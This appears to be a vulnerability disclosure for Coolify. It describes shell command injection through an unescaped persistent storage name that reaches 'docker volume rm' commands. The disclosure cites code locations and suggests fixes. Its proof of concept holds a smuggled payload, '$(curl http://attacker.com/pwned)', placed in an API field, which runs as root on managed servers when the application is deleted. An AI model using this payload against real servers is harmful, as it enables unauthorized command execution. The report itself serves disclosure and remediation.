repo.description:
## Summary

The `LocalPersistentVolume.name` field is interpolated directly into shell commands (`docker volume rm -f $storage->name`) without `escapeshellarg()`. An authenticated user can set a storage name containing shell metacharacters via the API, achieving command execution on managed servers when the resource is deleted.

This is the same class of bug as CVE-2025-66213 (which fixed `LocalFileVolume.fs_path`) but in a different model and code path that was not patched.

## Root Cause

**Sink (8+ files):**

`app/Actions/Service/DeleteService.php:36`:
```php
$commands[] = "docker volume rm -f $storage->name";
```

Same pattern in `Application.php:393`, `ApplicationPreview.php:29,40`, `StandaloneRedis.php:143`, `StandaloneClickhouse.php`, `StandaloneMongodb.php`, `StandaloneMariadb.php`, `StandaloneDragonfly.php`.

`instant_remote_process()` joins commands with newlines into a bash heredoc via SSH. No escaping.

**Source (no validation):**

API PATCH `app/Http/Controllers/Api/ApplicationsController.php` `update_storage()`:
```php
$validator = customApiValidator($request->all(), ['name' => 'string']);
$storage->name = $request->name;
$storage->save();
```

No regex, no `escapeshellarg`, no `validateShellSafePath`. The API path sets the name directly without the UUID prefix that the Livewire path adds.

## Proof of Concept

```bash
# 1. Create storage with malicious name via API
curl -X POST https://coolify/api/v1/applications/{uuid}/storages \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"name": "test$(curl http://attacker.com/pwned)", "mount_path": "/data", "type": "persistent"}'

# 2. Delete the application (triggers docker volume rm)
curl -X DELETE https://coolify/api/v1/applications/{uuid} \
  -H "Authorization: Bearer <token>"

# 3. Server executes: docker volume rm -f test$(curl http://attacker.com/pwned)
#    The $(curl ...) runs as root on the managed server
```

## Inconsistency

The codebase uses `escapeshellarg()` in 15+ other locations. `LocalFileVolume` was patched with `escapeshellarg` after CVE-2025-66213. `LocalPersistentVolume.name` was not.

## Suggested Fix

Wrap all `$storage->name` interpolations with `escapeshellarg()`:
```php
$commands[] = "docker volume rm -f " . escapeshellarg($storage->name);
```

Or add input validation on the name field:
```php
'name' => ['string', 'regex:/^[a-zA-Z0-9][a-zA-Z0-9._-]*$/'],
```
repo.summary: Command injection via unsanitized persistent storage name in docker volume commands
